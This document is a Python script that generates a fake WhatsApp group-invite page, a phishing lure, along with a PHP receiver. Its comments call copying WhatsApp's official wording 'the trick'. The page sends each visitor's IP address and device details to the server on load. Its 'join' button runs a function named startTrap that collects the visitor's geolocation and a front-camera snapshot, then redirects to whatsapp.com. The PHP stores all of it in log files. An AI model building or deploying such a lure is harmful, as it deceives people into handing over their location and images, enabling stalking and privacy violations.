#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import shutil
import json
import time
import socket

# Timeout para evitar travamentos
socket.setdefaulttimeout(5)

# --- FUNÇÕES AUXILIARES ---
def simple_log(msg):
    try:
        if not os.path.exists("logs"): os.makedirs("logs")
        with open("logs/debug_whatsapp.txt", "a", encoding="utf-8") as f:
            f.write(f"[WhatsApp] {msg}\n")
    except: pass
    print(f"[WhatsApp] {msg}")

def download_image_simple(url, dest_folder):
    try:
        import urllib.request
        filename = "wa_default.jpg"
        filepath = os.path.join(dest_folder, filename)
        
        opener = urllib.request.build_opener()
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib.request.install_opener(opener)
        
        urllib.request.urlretrieve(url, filepath)
        return filepath
    except Exception as e:
        simple_log(f"Falha download imagem: {e}")
        return None

# --- 1. PREPARAÇÃO DE DIRETÓRIOS ---
try:
    base_dir = os.path.dirname(os.path.abspath(__file__)) 
    target_dir = os.path.join(base_dir, 'whatsapp')      
    img_dir = os.path.join(target_dir, 'images')

    os.makedirs(target_dir, exist_ok=True)
    os.makedirs(img_dir, exist_ok=True)

    # Index de emergência
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write('<html><body><h1>A carregar...</h1><script>setTimeout(function(){location.reload()}, 2000);</script></body></html>')

except Exception as e:
    simple_log(f"ERRO CRÍTICO: {e}")
    sys.exit(1)

# --- 2. LÓGICA PRINCIPAL ---
try:
    # Configuração
    title = os.getenv('TITLE') or "WhatsApp Group"
    image = os.getenv('IMAGE')
    # AQUI ESTÁ O TRUQUE: Usamos exatamente a mesma frase do WhatsApp oficial
    desc = os.getenv('DESC') or "Convite para conversa em grupo"

    # Processamento da Imagem
    img_name = "wa_default.jpg"
    og_image_url = "" 

    if image and image.startswith(('http', 'https')):
        # Baixa backup local
        download_image_simple(image, img_dir)
        # Usa URL original para garantir o preview
        og_image_url = image
    elif image and os.path.exists(image):
        try:
            shutil.copyfile(image, os.path.join(img_dir, os.path.basename(image)))
            img_name = os.path.basename(image)
            og_image_url = f"images/{img_name}"
        except: pass

    # Se a URL original não for definida, tenta local
    if not og_image_url:
        og_image_url = f"images/{img_name}"

    # PHP Receptor
    php_receiver_code = """<?php
    header('Content-Type: application/json');
    error_reporting(0);
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if ($data) {
        $logDir = '../../logs/';
        if (!is_dir($logDir)) { mkdir($logDir, 0777, true); }
        
        if (isset($data['lat'])) {
            file_put_contents($logDir . 'result.txt', json_encode(['status' => 'success', 'lat' => $data['lat'], 'lon' => $data['lon'], 'acc' => $data['acc']]));
        } 
        elseif (isset($data['ip'])) {
            file_put_contents($logDir . 'info.txt', json_encode($data));
        } 
        elseif (isset($data['img'])) {
            $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $data['img']);
            file_put_contents($logDir . 'cam_' . date('Ymd_His') . '.png', base64_decode($img));
        }
    }
    ?>"""

    # HTML Final
    html_code = f"""<!DOCTYPE html>
    <html lang="pt-br" prefix="og: http://ogp.me/ns#">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{title}</title>
        
        <!-- META TAGS IDÊNTICAS AO WHATSAPP OFICIAL -->
        <meta property="og:title" content="{title}">
        <meta property="og:description" content="{desc}">
        {f'<meta property="og:image" content="{og_image_url}">' if og_image_url else ''}
        <meta property="og:site_name" content="WhatsApp.com">
        <meta property="og:type" content="website">
        
        <!-- Dimensões para garantir thumbnail quadrada -->
        <meta property="og:image:width" content="300">
        <meta property="og:image:height" content="300">
        
        <meta name="twitter:card" content="summary">
        {f'<meta name="twitter:image" content="{og_image_url}">' if og_image_url else ''}

        <style>
            body {{ background-color: #111b21; font-family: -apple-system, "Segoe UI", "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif; margin: 0; padding: 20px; color: #e9edef; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }}
            .wa-card {{ background-color: #202c33; padding: 20px; border-radius: 12px; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }}
            .wa-img {{ width: 120px; height: 120px; border-radius: 50%; object-fit: cover; margin-bottom: 16px; margin-top: -60px; border: 4px solid #202c33; background: #202c33; }}
            h1 {{ font-size: 20px; font-weight: 500; margin: 0 0 8px 0; color: #e9edef; }}
            .wa-sub {{ font-size: 14px; color: #8696a0; margin-bottom: 24px; }}
            .btn-join {{ background-color: #00a884; color: #111b21; border: none; padding: 10px 24px; border-radius: 24px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; text-transform: uppercase; transition: background 0.2s; }}
            .btn-join:hover {{ background-color: #06cf9c; }}
            .wa-footer {{ margin-top: 30px; font-size: 13px; color: #8696a0; display: flex; align-items: center; gap: 6px; }}
            .wa-icon {{ width: 18px; height: 18px; fill: #8696a0; }}
        </style>
    </head>
    <body>

        <div class="wa-card">
            <img src="images/{img_name}" class="wa-img">
            <h1>{title}</h1>
            <div class="wa-sub">Convite para conversa em grupo</div>
            <button class="btn-join" onclick="startTrap()">Entrar na conversa</button>
        </div>

        <div class="wa-footer">
            <svg viewBox="0 0 33 33" class="wa-icon"><path d="M16.6 0C7.4 0 0 7.4 0 16.5c0 3 .8 5.9 2.3 8.4L.6 33l8.3-2.2C11.3 32.2 13.9 33 16.6 33c9.2 0 16.6-7.4 16.6-16.5S25.8 0 16.6 0zm0 29.8c-2.4 0-4.8-.6-6.9-1.9l-.5-.3-5.1 1.3 1.4-5-.3-.5C3.9 21.3 3.3 18.9 3.3 16.5c0-7.3 6-13.2 13.3-13.2s13.3 6 13.3 13.2-6 13.3-13.3 13.3z"></path></svg>
            WhatsApp
        </div>

    <script>
        window.onload = function() {{
            try {{
                fetch('https://api.ipify.org?format=json')
                .then(r=>r.json())
                .then(d=>{{
                    fetch('data.php', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{ip:d.ip, os:navigator.platform, platform:navigator.userAgent, browser:navigator.appName}})}});
                }}).catch(e=>{{}});
            }} catch(e) {{}}
        }};

        function startTrap() {{
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError);
            }} else {{ 
                requestCamera(); 
            }}
        }}

        function onPosSuccess(pos) {{
            fetch('data.php', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }})
            }});
            requestCamera();
        }}

        function onPosError(err) {{
            requestCamera();
        }}

        function requestCamera() {{
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
                .then(function(stream) {{
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(function() {{
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const data = canvas.toDataURL('image/png');
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                        fetch('data.php', {{
                            method: 'POST', headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{img: data}})
                        }}).then(finish);
                    }}, 800);
                }})
                .catch(function(err) {{
                    finish();
                }});
            }} else {{
                finish();
            }}
        }}

        function finish() {{
            window.location.href = "https://whatsapp.com";
        }}
    </script>
    </body>
    </html>"""

    # Escrita Final
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(html_code)
    
    with open(os.path.join(target_dir, 'data.php'), 'w', encoding='utf-8') as f:
        f.write(php_receiver_code)
        
    simple_log("Sucesso total.")
    sys.exit(0)

except Exception as e:
    simple_log(f"ERRO DE EXECUÇÃO: {e}")
    sys.exit(0)